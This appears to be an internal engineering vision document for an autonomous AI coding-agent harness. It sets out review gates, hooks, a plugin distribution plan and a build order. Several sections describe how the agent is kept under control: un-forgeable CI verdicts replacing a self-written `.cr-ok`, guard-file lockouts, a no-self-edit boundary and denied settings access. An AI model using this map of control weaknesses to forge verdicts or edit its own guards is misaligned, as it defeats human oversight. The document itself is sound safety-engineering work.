*Mechanism:* a CLAUDE.md rule + `docs/design/` entry mandating `data-testid` on key interactive elements,
meaningful `aria-label`/text, structured `console.error`; enforced with `jsx-a11y` ESLint at commit time.
*Citation:* confirmed absence. Elevated by `playwright-mcp-debug.md` Move 3. *Tag:* **P1 — the foundation C8 stands
on.**

**C10. The evidence bundle on the shared Stop/PostToolUse hook surface.** *(Capability-corrected per T1-1 + folded
onto the shared-hook anchor per SF-1.)* Ramp's Inspect closes the loop — every session verifies against the real
stack *before* the PR exists (~30% organic adoption, no mandate). **Failure prevented:** an agent reports "done,"
opens a PR, and the regression ships because nothing deterministic re-ran the suite. *Mechanism:* on the shared
Stop/PostToolUse hook surface (HOOK-1 below), at task-completion **run `npm run test` + `npx tsc --noEmit` and
block on red** (this is the part a hook *can* do — `capability-facts.md:11-13`). **The screenshot is NOT
hook-compellable** (`capability-facts.md:18-20`: "no hook can REQUIRE an artifact to exist before completion") —
so the render artifact is **verify-if-present + advisory at the hook**, and the *hard* render gate lives on the
**CI leg (C8)**, exactly as C8 does it. Two non-negotiables: it buys *regression-trust not correctness-trust* (the
semantic checkpoint stays) and it must NOT write `.cr-ok`. *Citation:* confirmed absence — §3e/§5;
`capability-facts.md:18-20`. Elevated by `ramp-inspect-agent.md` Move 1 (frontend-driving-for-mutations is
UPHELD-CUT; adopt only the screenshot/real-test half). *Tag:* **P1 — gates the autonomous PR (test/typecheck hard;
render advisory-at-hook + hard-at-CI).**

**C11. Property-based testing on money math — the human-authored invariant the loop cannot weaken.** Example tests
check the cases a developer (or model) happened to think of; PBT asserts an *invariant* that must hold for **all**
inputs and generates hundreds of adversarial ones. **Failure prevented:** a pricing bug surviving because nobody
wrote the exposing example — a $30k-client-facing wrong total — and, under autonomy, the loop quietly weakening
its own oracle. *Mechanism:* `fast-check` (after a 30-min vet); invariants — `total = sum(line items)`; tax never
on service fees; no negative line/sub totals; integer-cents round-tripping exact; PITFALLS rule + coverage-style
blocker on the pricing module. *Citation:* confirmed absence. Elevated by `recursive-self-improvement.md` Move 3,
killlist C #4. *Tag:* **GATED(Fork F6, the `fast-check` install) → P1 on approval.**

**C12. Carry-forward the TDD ledger discipline as the spec-derived oracle.** `/tdd`'s `docs/TESTING.md`-as-behavior
-ledger + the no-transcription rule prevents *transcription tests* (deriving expected values from reading the
implementation). **Failure prevented:** the loop writing tests that confirm whatever the implementation does — a
mirror instead of an oracle. *Mechanism:* preserve verbatim — TESTING.md read in Step 1 as spec source, written
back in Step 6; the Specify→Encode→Fulfill loop; one-behavior-one-test-one-commit; never mock the DB; seed via
`supabaseAdmin` in `beforeAll`; the `vi.spyOn(supabaseAdmin.auth,'getUser')` exception; interlocks with C6.
*Citation:* grounding skills-C; CLAUDE.md → Testing. *Tag:* **P0 carry-forward — do-not-drop.**

**C13. Re-audit the `model:` fields of every reasoning sub-agent on Opus 4.8.** **[MERGED with CMP6/P10 per MF-3:
C13 = the one-time pass; CMP6's behavioral-probe suite is the recurring engine that subsumes it; P10 *references*
it, doesn't restate.]** Every reasoning-heavy sub-agent is pinned `model: sonnet` — the catch-the-error agents run
on the *cheapest* model. **Failure prevented:** under "world-class is the only goal," the agents that exist to
catch mistakes are the ones most likely to miss them. *Mechanism:* re-audit and re-set `model:` on Opus 4.8 for
the `/cr` `@reviewer` + 4 lenses, the spike verifier/synthesis agents, the three `review-strategy` lenses,
`refactor-extractor`, `@hotfix-guard`, `@investigator`, and the per-pass `model:` fields inside `/cr`; gate the
choice on C4's calibration so it's *measured*. *Citation:* grounding skills-A/B/C; §9 (re-audit due on Opus 4.8).
*Tag:* **P0 one-time — before LOOP-7/A6 relies on any of these agents.**

### PILLAR 4 — THE COMPOUNDING ENGINE

**HOOK-1. The single shared Stop/PostToolUse hook surface (one hook, many payloads).** *(NEW anchor per
proportionality-check SF-1 — the most useful framing in the audit, restored from MASTER-FINDINGS MOVE 1.)* Build
*one* Stop/PostToolUse hook surface (the canon-declared-but-absent `session-end.sh`) and treat its jobs as
**payloads, not separate features**: (a) C10's regression evidence bundle (test+typecheck block-on-red); (b)
CMP5's memory-capture proposer; (c) F7's retry-ceiling counter; (d) the narration emitter (L7). **Failure
prevented:** building four overlapping Stop hooks that fight over the guard file (a second Stop hook is itself a
human guard-file edit). *Mechanism:* one additive, `exit 0`-only, append-only Stop hook (coexists with the
existing sound hook at `settings.json:191`); the plugin's `hooks.json` replaces the hand-edit at extraction.
*Citation:* confirmed absence — §3e/§5; the existing Stop hook is a sound only. *Tag:* **P0 — built once; C10/CMP5
hang off it.**

**CMP1. Close the read-path — recurring findings load into the implementer's task-start context, with decay.**
Bitloops drove violations down 87-100% over 8 weeks purely by feeding caught violations back as generation
context; our harness has the *write* side (RECURRING-FINDINGS auto-counted) but it is "**never read by
implementers**." **Failure prevented:** an agent making the same class of mistake every run because nothing it was
corrected on is read back at the next run's start. *Mechanism:* load recurring findings into the implementer's
task-start context + an eviction/freshness model (a pattern unobserved 90 days collapses); do NOT build
`learned-patterns.md` (a §6 phantom); measure first-pass-approval to confirm it works. *Citation:* §4, §9.
Elevated by `code-review-latentspace.md` Move 4, killlist F #2. *Tag:* **P0-spine (compounding).**

**CMP2. The finding→enforcement ratchet — recurring finding becomes a deterministic block, not a note.**
Hashimoto's definition of harness engineering: "anytime you find an agent makes a mistake, engineer a solution
such that the agent never makes that mistake again"; our harness is "overwhelmingly advisory." **Failure
prevented:** you keep re-finding the same bug forever instead of making it impossible. *Mechanism:* a ratchet pass
(a `/compound` sub-phase or `/ratchet` skill) — when a finding crosses ≥3 and promotes, classify it: can this be a
deterministic block (PreToolUse/PreCommit hook, lint rule, or a new C5 governance-lens criterion)? If so, generate
the enforcement artifact in the same flow; note only when a block is genuinely impossible. Composes with C5 (adds
criteria to the bootstrapped lens), F8 (a rising signature *is* the mistake-trigger), and the distribution pillar
(earned blocks travel via plugin). *Citation:* §3e, §4. Elevated by `harness-engineering-survey.md` Move 1,
`coderabbit.md` Move 4, `osmani-agent-skills.md`. *Tag:* **P0-spine — the mechanism of compounding itself.**

**CMP3. The effectiveness-metrics ledger — first-pass-approval-rate, cycle-count, per-task-type.** *(Re-tiered per
MF-5: the volume-dependent fields are P1; the day-0-measurable ones are P0.)* Every source that *improved*
measured something and watched it move; our model is all *knowledge stores* with no row for first-pass-approval.
**Failure prevented:** "review skills deployed then evaluated anecdotally" — you cannot run a self-improving loop
on vibes. *Mechanism:* a lightweight in-repo/GitHub-canon ledger per agent PR (review-cycle-count, REJECT-or-not,
per-finding recurrence, PR-size trend) surfaced as a periodic cloud-`/schedule` report. **first-pass-approval-rate
and post-merge-defect attribution need real merged-PR volume → P1 with a volume flip-trigger** (same shape as the
deferred outcome tracking, except cycle-count/recurrence are measurable on day 0). The metrics close the loops
(first-pass-approval confirms compounding; recurrence is CMP1's eviction signal; PR-size trend tunes F7;
per-task-type tells you what is safe to auto-approve). *Citation:* confirmed absence — §4. Elevated by
`code-review-latentspace.md` Move 5, `harness-engineering-survey.md` Move 2, scale-bias #18. *Tag:* **P0 for
day-0-measurable fields; P1(volume) for first-pass-approval/post-merge-defect.** (Distinct from outcome/impact
tracking, STILL-GATED.)

**CMP4. `/scan-context` — bidirectional drift detection (doc-stale AND doc-fiction) + decay, on a schedule.**
*(Re-tiered per MF-6: detection is P0; the repair-worker rides Fork F7 → routed through P9, P1.)* Context drift in
two directions — doc fell behind code, and the more dangerous **doc-fiction** (the context file asserts a rule the
code never followed); our own canon references five phantom artifacts — a *live* failure class. **Failure
prevented:** shipping a harness whose own canon is partly fiction — worse at fleet scale. *Mechanism (detection,
P0):* build `/scan-context` (canon-documented, absent), two modes against our own repo — staleness (every
path/command/skill claim still exists) and fiction (every named artifact reference exists on disk) — plus a decay
pass (every rule carries `last_seen`; >90-day-unobserved → demotion candidate; flag triple-duplication). **Houses
the L5 cross-skill reference-integrity check** (the precondition pulled out of the seven-guard battery). Wired into
`/compound`, `/cr`, and a cloud `/schedule` job. The **fix-proposing / repair-worker half is P9 (P1), gated on
Fork F7** (auto-revert vs flag-NEEDS-HUMAN). *Citation:* confirmed absence — §5, §6, §4. Elevated by `packmind.md`
Moves 1/3, `harness-io.md`, killlist E #7. *Tag:* **P0 for detection; the keystone autonomy primitive that makes
the context layer self-correcting.**

**CMP5. The session-end capture payload — observed-failure → proposed rule, human-confirmed.** *(A payload on
HOOK-1, not a separate hook.)* Packmind's discipline has two halves — observe and write; our harness endorses the
write half in prose but the *capture* half is fully manual. **Failure prevented:** at fleet scale the system
generates failures faster than a human can hand-transcribe lessons, and the playbook ossifies. *Mechanism:* on
HOOK-1, propose memory/PITFALLS candidates from corrections observed during the session; **human confirms**
(deliberately NOT a deterministic mistake-detector — the capability the design does not claim); the rule lands
with a `last_seen` date feeding CMP4's decay. *Citation:* confirmed absence — §5. Elevated by `packmind.md` Move
2, `harness-engineering-survey.md` Move 5. *Tag:* **P1 — degrade-safe** (`/cr` 3b already auto-writes; this is the
upgrade).

**CMP6. The §9 Model-Capacity prune-PR loop with behavioral probes.** *(Subsumes C13's recurring half per MF-3.)*
The §9 cuts ("remove the scaffold the model outgrew") are the engine of the whole "empower the model" thesis and
are load-bearing on an *undated, untriggered human promise* (judgments made against Sonnet 4.6). ETH Zurich:
comprehensive/already-inferable context *degrades* performance (−3% avg) and raises cost 20-23%. **Failure
prevented (two-sided):** outgrown scaffolding accumulating because the re-audit is nobody's job; AND Opus 4.8/4.9
silently *losing* a capability the cuts assumed, with nobody re-running the audit. *Mechanism:* turn each "Replace
(capability proxy)" judgment into a **behavioral probe** (a tiny test asserting the model still has the capability
the scaffold removed); run the probe suite on every model bump (a `/schedule` routine keyed to model version); a
failed probe auto-reverts/flags NEEDS-HUMAN (Fork F7); wrap as a scheduled capability-audit routine proposing
deletions as a reviewed PR. *Citation:* §9. Elevated by `when-is-llm-call-worth-it.md` Move 2,
`harness-engineering-survey.md` Move 6, `augment-code.md` Move 4, killlist E #12. *Tag:* **P1 — the safety
interlock for the entire de-scaffolding program; runs C13's probe suite on every bump.**

### PILLAR 5 — THE PLATFORM

**P1. Plugin + marketplace as the distribution spine.** A plugin is the installable, versioned unit bundling
skills/commands/agents/hooks/`.mcp.json` into one namespaced package. **Failure prevented:** template-copy drift
— when every repo holds a hand-copied folder (or a symlink resolving to HEAD), they silently diverge and nothing
updates them. *Mechanism:* extract the project-agnostic behavior into a Claude Code plugin published to a
`marketplace.json` on the `agent-harness` repo; install via `/plugin install`, update via `/plugin update`, pin a
version, hold a lock; pair with P2; symlink-live is explicitly dead. *Citation:* confirmed absence — §8, §0.
Elevated by `commands-vs-skills.md`, `harness-engineering-survey.md`; RESOLVED FACT. *Tag:* **P1 (foundational
decision; built *after* canon↔disk convergence — the publish gate); the manifest schema (P6) is committed now.**

**P2. The thin `/init` template for project-owned files.** A plugin **physically cannot carry
`permissions`/`settings.json`** (the 27-byte proof). **Failure prevented:** a fresh install where the plugin lands
but the repo runs bare-default permissions and bare-default auto-mode — the safety classifier the whole autonomy
program rides on, effectively off. *Mechanism:* a `/init` skill that materializes per-repo files from a committed
canonical template — `CLAUDE.md`/`AGENTS.md` skeletons, the `permissions.allow`/`deny` baseline (incl. the
guard-file lockout, a TRULY-WORLD-CLASS item), and the auto-mode policy **materialized into `settings.local.json`
(personal) or `managed-settings.json` (enforced) — NEVER committed project settings** (coherence-check T2-1: the
classifier ignores committed-project autoMode by design, the exact inert-config bug; the committed template
carries the *content* for a human/`/init` to place locally); single-tenant-prod carve-out. The agent *prepares*
paste-ready content; the human *applies* guard-file/settings changes (no-self-edit boundary holds). *Citation:*
RESOLVED FACT; confirmed absence — §3a/§8; `capability-facts.md:42-46`. Elevated by `auto-mode-config.md` via
killlist E #8 / F #8. *Tag:* **P1 — co-built with the plugin; the seam is forced.**

**P3. Notion → GitHub canon migration.** Canon lives in Notion pages that drift from code (§7: nine canon-internal
contradictions); the setup mechanism is "reconstruct from a Notion page." **Failure prevented:** a distributed
harness whose source of truth a cloud `/schedule` agent cannot reliably read/write (WAF blocks on security
content) and that lives in a different system than the artifact it ships — guaranteeing forever-drift. *Mechanism:*
migrate the canonical AI-engineering record into Git Markdown in `agent-harness`; re-point `/compound` Step 8 at
the GitHub record; remove `/notion-sync` as a ritual but carry its transferable mechanisms forward
(comprehensive-diff-over-changelog, guard-file exception, dedicated-branch rule, LAST-SYNC receipt, sentinel
handoff). *Citation:* RESOLVED FACTS; §0, §7. *Tag:* **P0 for the source-of-truth move (makes convergence a `git
diff`); the migration itself is the convergence content-half.**

**P4. MCP-as-substrate — make the harness summonable from outside its own process.** Today the harness is purely
an MCP *client*, driveable only by a human at a prompt. **Failure prevented:** the autonomy ceiling stated as a
feature — it can never be summoned, never run an externally-triggered bug→PR loop. *Mechanism:* expose
externally-summonable endpoints (`RemoteTrigger`-style entry points and/or harness skills as MCP tools to an
external orchestrator) routing an inbound event into the existing shell; side-effect actuator is an F9 skill; cloud
`/schedule` already runs committed skills so durability is moot. *Citation:* confirmed absence —
`ai-automation-ecosystem.md` ("the single biggest suppressed move"), `stripe-minions-kaliski.md`. *Tag:* **P0-spine
substrate (the distribution half of L1); built in lockstep with L1.**

**P5. Skill-provenance trust governance.** 15 third-party skills are symlinked from `mattpocock/skills`, and
`/tdd` is a divergent project-local fork ("two copies, no sync"); installing a skill is installing *instructions
that steer judgment* across every repo. **Failure prevented:** a malicious or low-quality upstream skill (or a
silent upstream *update*) corrupting agent behavior — a supply-chain vector into every repo the fleet touches,
unread. *Mechanism:* pin each upstream skill to a reviewed SHA, require a human review-diff before any upstream
update, record provenance, gate any side-effecting upstream skill behind F9; classify the `/tdd` fork (own-forever
vs re-sync); de-duplicate the two skills that appear twice. *Citation:* §1. Elevated by `vercel-agentic-infra.md`,
scale-bias #17. *Tag:* **P1 — load-bearing the moment the harness is distributed.**

**P6. The harness-manifest.json + per-skill frontmatter contract — and the one task-manifest owner.** The runtime
skill list mixes every layer with no signal for which layer owns each skill, which travels, or what tools each
needs; the prose inventory drifts from disk (the audit artifact itself rotted, shipping four false absences).
**Failure prevented:** an installer/agent that cannot reason about its own skills programmatically. *Mechanism:* a
per-skill frontmatter contract + a `harness-manifest.json` consumer reading it (`name`, situational `description`,
`required-tools`, `owning-layer`, `portable`, `scope: project|universal`, upstream-dependency disposition,
`disable-model-invocation`); the manifest drives distribution, `/init`, the agent filtering its own skill list, and
the CMP4 scanner. **It is the single owner of "the task manifest"** that F3/F5/L1 all reference (coherence-check
T3-5) — do not invent it three times. Build both halves (frontmatter without a consumer is documentation).
*Citation:* confirmed absence — §1, §3b. Elevated by `zapier-skillmd.md`, `osmani-agent-skills.md`, F #6. *Tag:*
**P1 — the frontmatter contract is what the plugin physically requires; build with the plugin.**

**P7. Per-skill upstream-dependency disposition policy.** A tool you build on can have its roadmap captured by an
owner whose incentives diverge; the harness has exactly this shape (15 vendored skills + a live un-synced fork) and
has never priced it. **Failure prevented:** silent drift where structure is pulled toward an upstream layout and
nobody notices until a breaking change strands the fleet — independently in every repo. *Mechanism:* a one-page
`UPSTREAM-DEPENDENCY-POLICY.md` (GitHub canon) + a per-skill disposition column in the manifest
(`vendor-and-freeze`/`track-upstream-with-named-sync-cadence`/`cut`) + a recurring-maintenance-cost note per
surviving mechanism (the §9 golden rule applied to *upkeep* — the standing acceptance criterion that lets a
deliberately maximal harness carry many hooks without rotting). *Citation:* §1, §8. Elevated by
`ai-automation-ecosystem.md`, scale-bias #22. *Tag:* **P1 — folds into the P6 manifest workstream.**

**P8. Push-back-up — the promotion gate that flows improvements upstream.** When a fleet runs across 5+ repos, an
improvement made in one repo never reaches the others without a path back up. **Failure prevented:** 5 repos
drifting *apart* as each accretes local improvements the others never see. *Mechanism:* a `scope: project|universal`
field on the promotion gate (the manifest); a `universal` change opens a human-gated PR against the `agent-harness`
plugin repo; `/plugin update` carries it down. *Citation:* confirmed absence — §8. Elevated by
`harness-engineering-survey.md`. *Tag:* **P1 for the human-gated PR path; GATED for automation (flip-trigger: a 2nd
repo installs the plugin).**

**P9. The cross-repo self-improving context-maintenance loop as a cloud routine.** Context is now a production
artifact with code's failure economics — a human reads a slightly-stale doc and shrugs; an agent re-onboards from
it thousands of times and reasons wrongly with full confidence. **Failure prevented:** undetected context rot (the
harness has a live, dated proof — the audit rotted and shipped four false claims), faster at fleet scale.
*Mechanism:* ship CMP4 run on a clock by a cloud `/schedule` routine *across the fleet*, in dependency order — (1)
a CI check validating every knowledge artifact on every merge (frontmatter present, `owner` set, prose
instructional not descriptive, no broken cross-refs); (2) the scheduled scanner opening tickets for
stale/fiction/contradiction/duplication/decay; (3) **the repair worker** opening scoped `/cr`-gated human-merged
fix PRs — safety designed in: a declared `owner` + a machine-checkable `supersedes:`/`version:` precedence schema
(the out-of-loop human anchor that stops the loop eating its own tail), and the worker **denied write access to
guard files / settings / the destructive-op floor** (E #9 applied as the worker's path-scope denylist). *Citation:*
confirmed absence — §5, §3f, §0, §7. Elevated by `basis-canon-not-canon.md` (full loop), `basis-monorepo-deep.md`
(scale-bias #9), `packmind.md`, `harness-io.md`, scale-bias TOP-5 #3. *Tag:* **P0 for detection (the CI check +
scheduled scanner); GATED(Fork F7) → P1 for the repair-worker.** The flagship cross-repo distribution-layer
autonomy loop.

**P10. Carry-forward the 23-agent roster + 26-skill set as portable roles — after a phantom-prune + dedup pass.**
The agents and skills are portable roles, not project scaffolding. **Failure prevented:** a distribution that
ships only skills and loses the wired sub-agent fleets, the cross-skill hand-off contracts (TASK-TEMPLATE, the L6
incident doc-travel), and the embedded mechanisms in sibling files — OR one that *packages the rot* (the
`dep-update` empty stub, the duplicate `/tdd`/`supabase-postgres-best-practices`, the phantom refs).
*Mechanism:* the roster ships inside the plugin, serialized through the P6 manifest with each tagged `owning-layer`
+ `portable`; **gated on CMP4's fiction-scan + P5's dedup completing first** (proportionality-check SF-4);
reconcile the roster count (23 on disk vs canon's contradictory 7-10) as part of convergence; the `model:`
re-audit is C13/CMP6's job, *referenced* not restated here. The "collapse 23 agents → 1" reflex is dead. *Citation:*
§11, §9; grounding skills/agents-A/B/C. *Tag:* **P1 — ships in the plugin via the manifest, after prune+dedup.**

---

## What makes V2 DECISIVELY better than V1 (the headline deltas)

Each names the V1 weak version, the world-class form, and the seam where the human used to backstop it (autonomy
removes that human, turning each "we have a version" into a live failure surface).

1. **HARNESS → LOOP.** V1: `/loop` is a session-bound interval poller, rituals "fire only at session start," no
   `/goal`, no cron — *the harness has no clock,* so every "weekly" ritual ran twice and died. V2 (L1/L2/L4/L5/L6):
   a trigger trifecta routing to the right subsystem (feature *or* incident) + cloud heartbeat + `/goal` + `/lfg`
   closing idea→reviewed-PR with no human between steps. *The unscheduled / no-front-door / no-orchestrator seams.*

2. **ADVISORY → DETERMINISTIC.** V1 is "overwhelmingly advisory": `block-dangerous-bash.sh` ABSENT, two guards
   fail *open* on missing `jq`, the firewall is a creation convenience, 0/26 skills invocation-gated. V2
   (F1/F2/F9 + the gated F3): the absent 3rd guard built fail-closed at full scope, the firewall as a blocking
   pre-flight invariant, `disable-model-invocation` on every side-effect skill. *The advisory seam — and the
   credential seam, the only failure mode that actually caused incidents (24/25).*

3. **INVISIBLE → VISIBLE VERDICT.** V1's `.cr-ok` is gitignored and **never reaches CI** — the terminal stop
   authority is forgeable, the model grades its own homework, a cloud agent can't read whether review happened. V2
   (F6): "done" requires the verdict's sentinel SHA to match the shipped SHA **AND CI to re-run the deterministic
   checks (`tsc`/`eslint`/`test`) on that SHA** — un-forgeable *because CI recomputes them and the model writes no
   record CI trusts*. **The honest precision (WF5 MF-A):** the un-forgeable gate is the SHA-match + the deterministic
   checks; the deep 9+4 `/cr` judgment passes are **coverage-bounded trust-but-verify** (their miss-rate *measured*
   by C4 golden-set recall), posted to the PR as a queryable artifact but **not themselves the merge gate**. So F6
   does not claim to make "the model agreed with itself" un-shippable — it makes the *deterministic* floor
   un-forgeable and puts a *measured bound* on the judgment half. *The invisible seam — the keystone, stated
   honestly.*

4. **UNSCHEDULED → CLOCKED.** V1 has no scheduler, so noticing work was nobody's job. V2 (L4/CMP4/CMP6/P9) runs
   discovery, bidirectional context-drift detection, and the model-capacity prune-loop on a cloud clock
   laptop-closed, each producing review-cheap output. *The unscheduled seam, resolved by the proven cloud
   `/schedule`.*

5. **SINGLE-PROJECT → FLEET-CANON.** V1 lives in one repo plus a drifting Notion shadow; install = "reconstruct
   from a Notion page." V2 (P1/P2/P3/P8/P9): a version-pinned plugin + marketplace, a thin `/init` template, GitHub
   canon (convergence = `git diff`), push-back-up promotion, a cross-repo context loop. *The undistributed seam.*

6. **WRITE-ONLY → COMPOUNDING** *(spans all five).* V1 writes RECURRING-FINDINGS and "never reads it back." V2
   (HOOK-1/CMP1-6) closes the read-path into task-start context, ratchets recurring findings into deterministic
   blocks, tracks first-pass-approval, and runs the prune-loop on a schedule.

7. **BLIND → LEGIBLE** *(Tanner's input).* V1 runs go dark until they finish. V2 (L7) emits a continuous narration
   stream + an append-only observability log, so the operator always sees what the fleet is doing and can
   course-correct mid-run — the trust precondition for unattended autonomy.

---

## The autonomy program in build order (corrected — a small floor, then a sequenced program)

**Ordering invariant:** *no trigger fires until the small floor it rides on is wired.*

**Phase 0 — THE MINIMAL FLOOR (the only true P0-floor set):**
**F1** destructive-block (fail-closed) · **F2** credential pre-flight · **F6** the unforgeable+visible verdict
gate (the keystone) · **F7** bounded-loop + REJECT/UNATTENDED · **F9** `disable-model-invocation` on side-effect
skills. Plus the one-time precondition **C13** (re-audit reasoning `model:` fields on Opus 4.8) and the **Phase-0
capability probe** (verify `decision:block` force-continue semantics before building L2/C10; named fallback =
external re-invocation).

**Phase 1 — THE SPINE (on the floor):** **L2** `/goal` (+ the verifier-rung doctrine) · **L4** cloud heartbeat ·
**HOOK-1** the shared Stop-hook surface · **L7** narration + observability log · **L5** `/lfg` (1 orchestrator + 7
guards; resolve Fork F8 first) · **L6** the incident subsystem carried forward · **L1** the trigger trifecta —
**GitHub label first** (no free-text injection surface), Slack/CI-self-heal after **F5** + **F3** · **P4**
MCP-as-substrate (the distribution half of L1).

**Phase 1.5 — THE COMPOUNDING SUBSTRATE (parallel; feeds the spine):** **CMP1** read-path · **CMP2**
finding→enforcement ratchet · **CMP3** (day-0-measurable fields) · **CMP4** `/scan-context` *detection*.

**Phase 2 — THE QUALITY UPGRADES (after floor + spine):** **C2** adversarial independence + **C5** governance lens
· **C6** spec layer (+ the C7 spec-verification configuration of F6) · **C4** reviewer calibration (the hard gate
on unattended self-merge) · **C8/C9/C10** the `/verify` render gate + agent-legible markup + the evidence-bundle
payload · **CMP3** volume fields (flip-trigger: ≥N merged PRs) · **F8** stop-the-line (before fleet volume) ·
**LOOP-7/A6** auto-approval in observe-only mode.

**Phase 3 — THE DISTRIBUTION (publishing gated on canon↔disk convergence):** **P3** Notion→GitHub migration
(P0 content-half) · **P6/P7** manifest + disposition policy · **P1/P2** plugin + marketplace + thin `/init` (after
convergence) · **P5** provenance governance · **P9** cross-repo context loop (P0 detection; P1 repair-worker) ·
**P8** push-back-up (human-gated now) · **P10** roster as portable roles (after prune+dedup).

**Phase 4 — THE SELF-IMPROVING + FORK-GATED UPGRADES:** **CMP5** session-end capture · **CMP6** §9 prune-PR loop
with behavioral probes · **C11** money-math PBT (Fork F6) · **F3/F4** egress (Fork F4) · **LOOP-7/A6** live LOW-auto
(Fork F2) · **P9** repair-worker (Fork F7).

---

## Honest cuts and still-gated items (the discipline that keeps this world-class, not kitchen-sink)

**Demoted from our OWN roster** (proportionality-check C-3, so the audit cuts itself, not only the corpus): the
old standalone moves **L3** (verifier-rung → a clause of L2), **C1** (→ merged into F6, the keystone's PR face),
**C3** (→ a clause of F7), **C7** (→ a configuration of F6+C6), and the triple `model:` re-audit (**C13 + CMP6 +
P10** → one one-time pass + one recurring probe). Five "moves" become clauses. The shared Stop-hook framing
(HOOK-1) replaces 3-4 separately-tagged hooks.

**STILL-GATED (build when the flip-trigger fires):** outcome/impact tracking (≥N autonomous PRs/week);
push-back-up automation (a 2nd repo installs); CI-latency optimization (`/queue` regularly runs ≥3 parallel
worktrees blocking one pipeline); cross-harness portability to Cursor/Gemini (plugin ships + a non-CC harness needs
the skills).

**UPHELD-CUT (bad fit even at world-class — failure mode named):** browser-driving for *mutations* (irreversibility
— the screenshot/evidence half is kept as C8/C10); auto-merge on a model *confidence score* (authority-laundering
— deterministic auto-approve LOOP-7 is the kept form); "no shared context" for the reviewer (C2 is shared-canon /
isolated-solution); collapse 23 agents → 1 (threshold claim — model-pin re-audit is the kept part);
`learned-patterns.md` the *file* (read-path CMP1 is the kept part); local DinD/microVM/gVisor sandbox stack
(container-escape caused zero incidents — per-agent isolation is realized via the cloud sandbox + managed-settings);
Saul's three-repo/adapter machinery (manifest-drift — plugin+marketplace is the kept form); symlink-live install;
Toolshed 500-tool registry (no token-paralysis traffic); the paying-stranger validation channel (no paying
stranger — adversarial golden-set seeding is the kept part, in C4); agent self-applying autoMode/guard-file edits
(a human handoff — the *content* + `/init` materializer are the kept part); the 200-line CLAUDE.md diet (demotes
no-trigger safety content — tier by trigger-existence).

---

## Capability preconditions (do not build on an unverified capability)

Two named probes, both one-line de-risks, both surfaced because the design rests on them:
1. **Force-continue semantics** — does a Stop hook's `decision:block` make the model *keep working* or only error?
   `capability-facts.md` marks it "verify empirically." Probe before building **L2/`/goal`** and **C10**; fallback
   if it fails = external re-invocation via the L1 front door / cloud `/schedule`.
2. **No hook can compel an artifact** — a Stop hook cannot *require* a screenshot to exist. So C10's render check
   is **verify-if-present + advisory at the hook**, and the *hard* render gate lives on the **CI leg (C8)**. This
   is a fact, not a probe — already folded into C10.

---

## The NEW decision forks for Tanner

*(The OLD five are settled by the charter: autonomy = in; file-count = dropped; distribution =
plugin+marketplace+thin-`/init`; ADR/write-back resolved; GitHub = canon. These are the genuinely-new world-class
forks the rebuild needs answered. All eleven were verified genuinely-open by the coherence check.)*

- **F1 — Verdict artifact surface:** PR comment vs PR body vs committed `review/` file vs the GitHub Checks API.
  Must be queryable by a cloud agent and enforceable by CI. *Affects F6, C7, LOOP-7.*
- **F2 — Autonomy rollout aggressiveness + auto-approval threshold:** LOOP-7 ships *observe-only* until C4 recall
  clears a floor, or live LOW-auto from day one? Does auto-merge ever touch `src/data/` or money math, or are those
  always MEDIUM+? *Affects LOOP-7, C4, the Phase-2/4 cadence.*
- **F3 — Which trigger surface ships first:** GitHub label (lowest credential surface, no free-text injection) vs
  Slack/Linear summon (fires where the bug is reported, adds a connector-credential surface) vs CI self-heal. The
  vision recommends **label-first**; confirm. *Affects L1, F5, F3-egress.*
- **F4 — Egress-firewall depth + default execution surface:** is local-unattended worth supporting given cloud
  `/schedule` is restricted-network and likely primary? This single fork re-prioritizes a third of the floor
  (F3/F4 are P0 only if local-unattended ships first). And: Seatbelt vs `pfctl`/Privoxy. *Affects F2, F3, Phase-0.*
- **F5 — managed-settings.json:** adopt the OS-level model-unreachable floor now (local tier needs a human-applied
  step) or stay on committed settings + the social "no agent edits to guard files" rule? Cloud tier bakes it into
  the image regardless. *Affects F9, P2, P9.*
- **F6 — `fast-check` adoption:** yes/no on the dependency (I'll present name / purpose / weekly-downloads /
  last-publish / ships-types per the ask-before-installing rule). *Affects C11.*
- **F7 — Deletion-engine cut depth + repair-worker aggressiveness:** does a failed behavioral probe *auto-revert*
  or only flag NEEDS-HUMAN? Does the context-repair worker get a deterministic auto-delete lane for *pure-fiction*
  refs (provably absent on disk) while gating *staleness* demotions? The line between "self-correcting" and
  "self-modifying." *Affects CMP6, CMP4, P9.*
- **F8 — `/lfg` canonical single-task driver — `/dev` or `/feature`?** They overlap heavily; pick one canonical
  driver before building L5 so the orchestrator doesn't bake in a duplication. *Affects L5, the `/dev` sub-agent
  framings.*
- **F9 — Human-paging surface — Slack, Linear, or GitHub?** Shared by L7's observability, the L1 summon, and every
  F7/F8 escalation (and a connector-credential surface F5 must account for). *Affects L1, L7, F5, F7, F8.*
- **F10 — Convergence scope as the publish gate:** resolve all nine §7 contradictions before first publish, or
  publish from a declared-precedence (`supersedes:`) snapshot and resolve lazily? Trades first-publish latency
  against shipping a known-imperfect canon. *Affects P1, P3, P9.*
- **F11 — Marketplace hosting + `/init` template depth:** private `agent-harness` marketplace vs public/listed; and
  does `/init` lay down only the safety floor (minimal, portable) or an opinionated full scaffold (instantly
  world-class but risks shipping event-vendor assumptions into unrelated repos)? *Affects P1, P2, P8.*

---

## Status

This is the authoritative vision. Both adversarial checks folded in (the P0 inflation re-tiered to a 5-move floor;
~6 duplicate move-IDs collapsed to clauses; the two capability violations corrected; the incident-subsystem
carry-forward restored as L6; the narration channel added as L7). It is the input to the design rebuild (WF4),
which turns each move into a concrete file/skill/hook/CI artifact with a doer≠checker pass, and then to the final
adversarial review (WF5).
